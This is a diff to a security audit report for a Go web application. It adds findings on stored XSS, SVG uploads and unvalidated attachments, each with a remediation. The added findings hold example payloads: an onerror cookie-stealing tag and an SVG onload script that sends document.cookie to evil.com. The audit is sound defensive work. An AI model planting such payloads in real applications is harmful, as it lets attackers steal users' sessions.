@@ -11,7 +11,7 @@
 
 This second assessment was conducted after an initial round of security fixes. The application has significantly improved — OIDC JWKS verification is now implemented, CSRF protection covers login, rate limiters have cleanup, and many IDOR issues were addressed. However, **critical gaps remain in layer-based access control across multiple data paths**, and several new findings emerge from deeper analysis of session management, SSE broadcasting, export endpoints, and concurrency handling.
 
-**Finding breakdown**: 8 High, 17 Medium, 8 Low, 6 Informational = **39 findings total**
+**Finding breakdown**: 10 High, 19 Medium, 8 Low, 6 Informational = **43 findings total**
 
 ---
 
@@ -87,7 +87,42 @@ The update handler checks `existing.CreatedBy != user.ID && !hasRole(user.Role, 
 
 ---
 
-### H-05: Sessions Not Invalidated After Self-Service Password Change
+### H-05: Stored XSS via Multiple Unsanitized Fields
+
+**Location**:
+- `main.go:3402-3423` — Event log entries: `Message`, `Summary`, `Source`, `Data` — **no `stripHTMLTags`**
+- `main.go:2825-2857` — Group name/description — **no sanitization**
+- `main.go:9561-9581` — Room name/description — **no sanitization**
+- `main.go:9365-9387` — Map location name — **no sanitization**
+- `main.go:1342-1345` — User display name at registration — **no sanitization**
+- `main.go:3230-3237` — User display name at admin creation/update — **no sanitization**
+
+**Severity**: **HIGH**
+
+While event titles/descriptions are sanitized with `stripHTMLTags()`, many other user-supplied text fields bypass sanitization entirely. Display names appear throughout the app (comments, audit logs, presence indicators). Group names appear in layer UIs and dropdown selectors.
+
+**Attack scenario**: A user self-registers with `display_name` set to `<img src=x onerror=alert(document.cookie)>`. Every time their name renders in another user's browser (comments, audit trail, event created-by), the XSS fires and steals session cookies. Alternatively, a TeamLead creates a group with a script tag in the name.
+
+**Remediation**: Apply `stripHTMLTags()` to all user-supplied text fields at every write handler: event log entries, group name/description, room name/description, map location name, user display name, template name/description.
+
+---
+
+### H-06: Stored XSS via SVG Upload as Map Resource
+
+**Location**: `main.go:12407` (allowed extensions include `.svg`), `main.go:12489-12504` and `main.go:14222-14231` (served via `http.ServeFile`)
+**Severity**: **HIGH**
+
+Map resource uploads explicitly allow `.svg` files. SVG files can contain embedded JavaScript (`<script>`, `onload`, etc.). Files are served via `http.ServeFile` with the original content type (`image/svg+xml`). When the browser renders the SVG directly (navigating to the file URL), JavaScript executes in the application's origin.
+
+The `handleMapResourceFile` endpoint may not require authentication and does not set `Content-Disposition: attachment`.
+
+**Attack scenario**: A TeamLead uploads an SVG containing `<svg onload="fetch('https://evil.com/'+document.cookie)">`. Any user navigating to `/api/map-resources/{id}/file` executes the script, leaking cookies.
+
+**Remediation**: Either (a) remove `.svg` from allowed extensions, (b) set `Content-Disposition: attachment` on all served files, (c) serve from a separate origin, or (d) sanitize SVG content on upload. Also ensure authentication is required.
+
+---
+
+### H-07: Sessions Not Invalidated After Self-Service Password Change
 
 **Location**: `main.go:1130-1189` (`handleChangePassword`)
 **Severity**: **HIGH**
@@ -102,7 +137,7 @@ Similarly, `handleResetPassword` (line 1905-1958, the forgot-password token flow
 
 ---
 
-### H-06: Data Race in GetDBStats — Write Under RLock
+### H-08: Data Race in GetDBStats — Write Under RLock
 
 **Location**: `store.go:554-555`
 **Severity**: **HIGH**
@@ -113,7 +148,7 @@ Similarly, `handleResetPassword` (line 1905-1958, the forgot-password token flow
 
 ---
 
-### H-07: Zip Bomb in Backup Restore — No Decompressed Size Limit
+### H-09: Zip Bomb in Backup Restore — No Decompressed Size Limit
 
 **Location**: `store.go:3536` and `main.go:13346`
 **Severity**: **HIGH**
@@ -124,7 +159,7 @@ When restoring backups, individual ZIP entries are read with `io.ReadAll(rc)` wi
 
 ---
 
-### H-08: TOCTOU Race Conditions in Read-Modify-Write Handlers
+### H-10: TOCTOU Race Conditions in Read-Modify-Write Handlers
 
 **Location**: Multiple handlers including `main.go:1148-1179` (`handleChangePassword`), `main.go:3227-3339` (`handleUpdateUser`)
 **Severity**: **HIGH**
@@ -332,6 +367,28 @@ Gradual backup restore writes restored data files with 0644 permissions instead 
 
 ---
 
+### M-18: No File Type Validation on Event/Logbook/Decision Attachments
+
+**Location**: `main.go:2515-2581`, `main.go:3493-3547`, `main.go:8587-8639`
+**Severity**: **MEDIUM**
+
+Unlike map resources (which have an extension allowlist), event, logbook, and decision log attachments accept any file type. Users can upload `.html` or `.svg` files containing scripts. While `handleDownloadAttachment` sets `Content-Disposition: attachment` (forcing download), some browsers may still render inline in edge cases.
+
+**Remediation**: Add a file type allowlist or blocklist. At minimum, ensure `Content-Disposition: attachment` and `X-Content-Type-Options: nosniff` on all served attachment files.
+
+---
+
+### M-19: Stored XSS via Template Names and Content
+
+**Location**: `main.go:4478-4512`
+**Severity**: **MEDIUM**
+
+`handleCreateTemplate` stores `tmpl.Name`, `tmpl.Description`, and template `Items` (event titles/descriptions) without `stripHTMLTags()`.
+
+**Remediation**: Apply `stripHTMLTags()` to template name, description, and all item text fields.
+
+---
+
 ## Low Severity Findings
 
 ### L-01: `handleUploadAttachment` Missing Layer Write Check
@@ -530,10 +587,12 @@ Backup encryption uses the admin account's bcrypt hash as PBKDF2 key material. I
 | H-02 | HIGH | AuthZ | Export endpoints (ICS/XLSX/STIX/Reports) bypass layer visibility |
 | H-03 | HIGH | AuthZ | Comments and attachments listed without layer access check |
 | H-04 | HIGH | AuthZ | handleUpdateEvent missing layer write check |
-| H-05 | HIGH | AuthN | Sessions not invalidated after self-service password change/reset |
-| H-06 | HIGH | Concurrency | Data race in GetDBStats — write under RLock |
-| H-07 | HIGH | DoS | Zip bomb in backup restore — no decompressed size limit |
-| H-08 | HIGH | Concurrency | TOCTOU race conditions in read-modify-write handlers |
+| H-05 | HIGH | XSS | Stored XSS via unsanitized fields (display name, groups, rooms, event log, map locations) |
+| H-06 | HIGH | XSS | Stored XSS via SVG upload as map resource (served inline with JS) |
+| H-07 | HIGH | AuthN | Sessions not invalidated after self-service password change/reset |
+| H-08 | HIGH | Concurrency | Data race in GetDBStats — write under RLock |
+| H-09 | HIGH | DoS | Zip bomb in backup restore — no decompressed size limit |
+| H-10 | HIGH | Concurrency | TOCTOU race conditions in read-modify-write handlers |
 | M-01 | MEDIUM | Crypto | OIDC JWT algorithm confusion (HMAC alongside JWKS) |
 | M-02 | MEDIUM | SSRF | OIDC discovery/token/userinfo use unprotected HTTP client |
 | M-03 | MEDIUM | AuthN | OIDC PKCE and nonce not required |
@@ -551,6 +610,8 @@ Backup encryption uses the admin account's bcrypt hash as PBKDF2 key material. I
 | M-15 | MEDIUM | Data | UserPublic leaks IPs, locations, security state |
 | M-16 | MEDIUM | DoS | Backup restore io.Copy bypasses multipart size limit |
 | M-17 | MEDIUM | Data | Restored files written with 0644 instead of 0600 |
+| M-18 | MEDIUM | XSS | No file type validation on event/logbook/decision attachments |
+| M-19 | MEDIUM | XSS | Stored XSS via template names and content |
 | L-01 | LOW | AuthZ | handleUploadAttachment missing layer write check |
 | L-02 | LOW | AuthZ | handleCreateComment missing layer write check |
 | L-03 | LOW | AuthZ | Auto-report email includes all events |
